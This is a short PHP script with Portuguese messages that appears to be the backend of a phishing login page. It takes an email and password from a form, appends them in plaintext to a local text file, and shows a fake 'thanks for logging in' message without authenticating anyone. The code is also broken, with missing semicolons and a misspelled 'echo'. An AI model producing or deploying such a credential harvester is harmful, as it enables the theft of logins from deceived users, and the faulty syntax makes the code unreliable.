<?php
if(isset($_POST['email']) && isset($_POST['senha'])){

$email = $_POST['email'];
$senha = $_POST['senha'];

$arquivo = fopen('dados.txt','a');

            if($arquivo){

                    fwrite($arquivo,$email."-".$senha."\n");
                    fclose($arquivo);

                    echo "<p>Obrigado por Fazer o Login</p>"
            }else{

                cho "<p>Erro ao fazer o login</p>"
            }
}

?>
<a href="index.html">Voltar</a>